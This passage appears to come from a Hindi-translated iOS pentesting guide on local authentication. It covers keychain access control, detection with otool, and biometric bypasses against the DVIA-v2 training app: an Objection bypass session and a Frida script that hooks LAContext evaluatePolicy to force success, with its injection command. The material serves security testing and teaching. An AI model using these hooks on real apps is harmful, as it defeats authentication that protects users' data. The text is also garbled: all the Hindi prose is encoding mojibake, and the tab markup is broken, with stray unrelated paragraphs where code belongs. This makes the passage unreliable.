* **`Security.framework`** рдирд┐рдЪрд▓реЗ рд╕реНрддрд░ рдХреА рдХреАрдЪреЗрди рд╕реЗрд╡рд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪ, рдмрд╛рдпреЛрдореЗрдЯреНрд░рд┐рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд╕рд╛рде рдЧреЛрдкрдиреАрдп рдбреЗрдЯрд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдирд╛ред рд╡рд┐рднрд┐рдиреНрди [рдУрдкрди-рд╕реЛрд░реНрд╕ рд░реИрдкрд░реНрд╕](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) рдХреАрдЪреЗрди рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рд╕рд░рд▓ рдмрдирд╛рддреЗ рд╣реИрдВред

{% hint style="danger" %}
рд╣рд╛рд▓рд╛рдВрдХрд┐, `LocalAuthentication.framework` рдФрд░ `Security.framework` рджреЛрдиреЛрдВ рд╣реА рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдмреВрд▓рд┐рдпрди рдорд╛рди рд▓реМрдЯрд╛рддреЗ рд╣реИрдВ рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдбреЗрдЯрд╛ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд┐рдП, рдЬрд┐рд╕рд╕реЗ рдЙрдиреНрд╣реЗрдВ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдмрдирд╛ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рджреЗрдЦреЗрдВ [Don't touch me that way, by David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM))ред
{% endhint %}

### рд╕реНрдерд╛рдиреАрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рдЕрдорд▓

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП, рдбреЗрд╡рд▓рдкрд░реЛрдВ рдХреЛ **`LAContext`** рд╡рд░реНрдЧ рдореЗрдВ **`evaluatePolicy`** рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рдореЗрдВ рд╕реЗ рдЪреБрдирдирд╛ рд╣реИ:

* **`deviceOwnerAuthentication`**: рдЯрдЪ рдЖрдИрдбреА рдпрд╛ рдбрд┐рд╡рд╛рдЗрд╕ рдкрд╛рд╕рдХреЛрдб рдХреЗ рд▓рд┐рдП рдкреНрд░рд╢реНрди рдЙрдард╛рддрд╛ рд╣реИ, рдпрджрд┐ рдХреЛрдИ рднреА рдирд╣реАрдВ рд╕рдХреНрд╖рдо рд╣реИ рддреЛ рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред
* **`deviceOwnerAuthenticationWithBiometrics`**: рдХреЗрд╡рд▓ рдЯрдЪ рдЖрдИрдбреА рдХреЗ рд▓рд┐рдП рдкреНрд░рд╢реНрди рдЙрдард╛рддрд╛ рд╣реИред

**`evaluatePolicy`** рд╕реЗ рдмреВрд▓рд┐рдпрди рд▓реМрдЯрд╛рдиреЗ рд╕реЗ рд╕рдлрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рджрд░реНрд╢рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдПрдХ рд╕рдВрднрд╛рд╡рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХреЛ рд╣рд╛рдЗрд▓рд╛рдЗрдЯ рдХрд░рддрд╛ рд╣реИред

### рдХреАрдЪреЗрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реНрдерд╛рдиреАрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг

iOS рдРрдкреНрд╕ рдореЗрдВ **рд╕реНрдерд╛рдиреАрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдХреАрдЪреЗрди API** рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реБрд░рдХреНрд╖рд┐рдд рдбреЗрдЯрд╛ рдЬреИрд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЯреЛрдХрди рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рд╕реНрдЯреЛрд░ рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рдбреЗрдЯрд╛ рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд╣реА рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЙрдирдХреЗ рдбрд┐рд╡рд╛рдЗрд╕ рдкрд╛рд╕рдХреЛрдб рдпрд╛ рдЯрдЪ рдЖрдИрдбреА рдЬреИрд╕реЗ рдмрд╛рдпреЛрдореЗрдЯреНрд░рд┐рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред

рдХреАрдЪреЗрди рдЖрдЗрдЯрдореНрд╕ рдХреЛ `SecAccessControl` рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рд╕рд╛рде рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдЖрдЗрдЯрдо рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рд░реЛрдХрддрд╛ рд╣реИ рдЬрдм рддрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЯрдЪ рдЖрдИрдбреА рдпрд╛ рдбрд┐рд╡рд╛рдЗрд╕ рдкрд╛рд╕рдХреЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдирд╣реАрдВ рдХрд░рддрд╛ред рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред

рдиреАрдЪреЗ рд╕реНрд╡рд┐рдлреНрдЯ рдФрд░ рдСрдмреНрдЬреЗрдХреНрдЯрд┐рд╡-рд╕реА рдореЗрдВ рдХреЛрдб рдЙрджрд╛рд╣рд░рдг рд╣реИрдВ рдЬреЛ рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдХреИрд╕реЗ рдХреАрдЪреЗрди рдореЗрдВ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рд╕рд╣реЗрдЬрдирд╛ рдФрд░ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛, рдЗрди рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдПред рдЙрджрд╛рд╣рд░рдг рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдХреИрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрдВрдЯреНрд░реЛрд▓ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯрдЪ рдЖрдИрдбреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдФрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдбреЗрдЯрд╛ рдХреЗрд╡рд▓ рдЙрд╕ рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░ рд╣реА рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕ рдкрд░ рдЙрд╕реЗ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЙрд╕ рд╢рд░реНрдд рдХреЗ рддрд╣рдд рдХрд┐ рдбрд┐рд╡рд╛рдЗрд╕ рдкрд╛рд╕рдХреЛрдб рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

{% tabs %}
{% tab title="рд╕реНрд╡рд┐рдлреНрдЯ" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %}рд╣реИрдХрд░реНрд╕ Objective-C рдХреЛрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдХреЛрдб рдЕрдиреБрд╕рдВрдзрд╛рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реЛ рд╕рдХрддрд╛ рд╣ред рдпрд╣рд╛рдБ рдХреБрдЫ рдЙрдкрдпреЛрдЧреА рдЯрд┐рдкреНрд╕ рд╣реИрдВ:

- рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдХреЛрдб рдореЗрдВ рдХреЛрдИ рд╕реБрд░рдХреНрд╖рд╛ рдЧрдбрд╝рдмрдбрд╝ рдирд╣реАрдВ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдЕрдиреБрдорддрд┐ рдирд┐рдпрдВрддреНрд░рдг рдХреА рдХрдореА рдпрд╛ рдЕрдиреБрдорддрд┐ рдХреЗ рдмрд┐рдирд╛ рд╕реЗрдВрд╕рд┐рдЯрд┐рд╡ рдбреЗрдЯрд╛ рдПрдХреНрд╕реЗрд╕ред
- рдХреЛрдб рдореЗрдВ рдХрд┐рд╕реА рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рддрд┐рдпреЛрдВ рдпрд╛ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдХреЙрд▓ рдХреЛ рдареАрдХ рдХрд░реЗрдВред
- рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдХреЛрдб рдореЗрдВ рдХреЛрдИ рд╣рд╛рд░реНрдбрдХреЛрдбреЗрдб рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдирд╣реАрдВ рд╣реИрдВ рдФрд░ рд╕рднреА рд╕реАрдХреНрд░реЗрдЯреНрд╕ рд╕реБрд░рдХреНрд╖рд┐рдд рддрд░реАрдХреЗ рд╕реЗ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИрдВред
{% endtab %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

рдЕрдм рд╣рдо рдХреАрдЪреЗрди рд╕реЗ рд╕рд╣реЗрдЬреЗ рдЧрдП рдЖрдЗрдЯрдо рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдХреАрдЪреЗрди рд╕реЗрд╡рд╛рдПрдВ рдкреНрд░рдпреЛрдХреНрддрд╛ рдХреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдВрд╡рд╛рдж рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░реЗрдЧреА рдФрд░ рдЙрдкрдпреБрдХреНрдд рдЕрдВрдЧреБрд▓реА рдЫрд╛рдк рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдбреЗрдЯрд╛ рдпрд╛ рд╢реВрдиреНрдп рд╡рд╛рдкрд╕ рдХрд░реЗрдЧреАред
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}рдпрд╣ рднрд╛рдЧ Objective-C рдкрд░ iOS рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдкреЗрдирдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рдЯреВрд▓реНрд╕ рдФрд░ рддрдХрдиреАрдХреЛрдВ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИред{% endtab %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
### рдкрддрд╛ рд▓рдЧрд╛рдирд╛

рдРрдк рдореЗрдВ рдлреНрд░реЗрдорд╡рд░реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рдРрдк рдмрд╛рдЗрдирд░реА рдХреА рд╕рд╛рдЭрд╛ рдбрд╛рдпрдирд╛рдорд┐рдХ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреА рд╕реВрдЪреА рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдХреЗ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕реЗ `otool` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
$ otool -L <AppName>.app/<AppName>
```
рдпрджрд┐ рдРрдк рдореЗрдВ `LocalAuthentication.framework` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЙрддреНрдкрд╛рджрди рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рджреЛ рдкрдВрдХреНрддрд┐рдпрд╛рдБ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВрдЧреА (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ `LocalAuthentication.framework` `Security.framework` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
рдпрджрд┐ `Security.framework` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдХреЗрд╡рд▓ рджреВрд╕рд░рд╛ рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

### рд╕реНрдерд╛рдиреАрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдлреНрд░реЗрдорд╡рд░реНрдХ рдмрд╛рдИрдкрд╛рд╕

#### **рдЖрдкрддреНрддрд┐**

**рдЖрдкрддреНрддрд┐ рдмрд╛рдпреЛрдореЗрдЯреНрд░рд┐рдХреНрд╕ рдмрд╛рдИрдкрд╛рд╕** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдЬреЛ [рдЗрд╕ GitHub рдкреЗрдЬ рдкрд░](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass) рд╕реНрдерд┐рдд рд╣реИ, рдПрдХ рддрдХрдиреАрдХ рдЙрдкрд▓рдмреНрдз рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕реНрдерд╛рдиреАрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рддрдВрддреНрд░ рдХреЛ рдкрд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХрд╛ рдореВрд▓ рддрддреНрд╡ **Frida** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ рддрд╛рдХрд┐ `evaluatePolicy` рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдорд╛рдирд┐рдпреЗ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реИ рдХрд┐ рдпрд╣ рд╣рдореЗрд╢рд╛ рдПрдХ `True` рдкрд░рд┐рдгрд╛рдо рджреЗрддрд╛ рд╣реИ, рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдлрд▓рддрд╛ рдХреЗ рдЕрдкрд░рд┐рд╣рд╛рд░реНрдп рд╣реЛрдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрджред рдпрд╣ рдЦрд░рд╛рдм рдмрд╛рдпреЛрдореЗрдЯреНрд░рд┐рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдШреБрдорд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧреА рд╣реИред

рдЗрд╕ рдмрд╛рдИрдкрд╛рд╕ рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
рдпрд╣ рдХрдорд╛рдВрдб рдПрдХ рдХреНрд░рдо рдХреЛ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ рдЬрд╣рд╛рдБ Objection рдПрдХ рдХрд╛рд░реНрдп рдХреЛ рдкрдВрдЬреАрдХреГрдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ `evaluatePolicy` рдЪреЗрдХ рдХреЗ рдкрд░рд┐рдгрд╛рдо рдХреЛ `True` рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рддрд╛ рд╣реИред

#### Frida

**`evaluatePolicy`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг [DVIA-v2 рдПрдкреНрд▓рд┐рдХреЗрд╢рди](https://github.com/prateek147/DVIA-v2) рд╕реЗ:
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
рджреНрд╡рд┐рддреАрдпрдХ рд╕реНрдерд╛рдиреАрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ **рдмрд╛рдИрдкрд╛рд╕** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рдлреНрд░рд┐рдбрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд▓рд┐рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ **evaluatePolicy** рдЪреЗрдХ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рдХреЗ рдХреЙрд▓рдмреИрдХ рдХреЛ рдЕрдВрддрд░реНрдЧрдд рдХрд░рдХреЗ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдпрд╣ **success=1** рд▓реМрдЯрд╛рддрд╛ рд╣реИред рдХреЙрд▓рдмреИрдХ рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдмрджрд▓рдХрд░, рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЬрд╛рдВрдЪ рдХреЛ рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рдмрд╛рдИрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдиреАрдЪреЗ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ **evaluatePolicy** рд╡рд┐рдзрд┐ рдХреЗ рдкрд░рд┐рдгрд╛рдо рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдХреЙрд▓рдмреИрдХ рдХреЗ рдкрд░рд┐рдгрд╛рдо рдХреЛ рд╣рдореЗрд╢рд╛ рд╕рдлрд▓рддрд╛ рдХреА рд╕реВрдЪрдирд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓ рджреЗрддрд╛ рд╣реИред
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
рдлреНрд░рд┐рдбрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдФрд░ рдмрд╛рдпреЛрдореЗрдЯреНрд░рд┐рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдЫрд▓рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## IPC рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдХрд╛ рдЙрдЬрд╛рдЧрд░ рд╣реЛрдирд╛

### рдХрд╕реНрдЯрдо URI рд╣реИрдВрдбрд▓рд░ / рдбреАрдкрд▓рд┐рдВрдХреНрд╕ / рдХрд╕реНрдЯрдо рд╕реНрдХреАрдо

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### рдпреВрдирд┐рд╡рд░реНрд╕рд▓ рд▓рд┐рдВрдХреНрд╕

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### UIActivity рд╕рд╛рдЭрд╛ рдХрд░рдирд╛

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### рдРрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### рд╡реЗрдмрд╡реНрдпреВ

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### рд╕рд┐рд░реАрдпрд▓рд╛рдЗрдЬреЗрд╢рди рдФрд░ рдЗрдиреНрдХреЛрдбрд┐рдВрдЧ

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## рдиреЗрдЯрд╡рд░реНрдХ рд╕рдВрдЪрд╛рд░

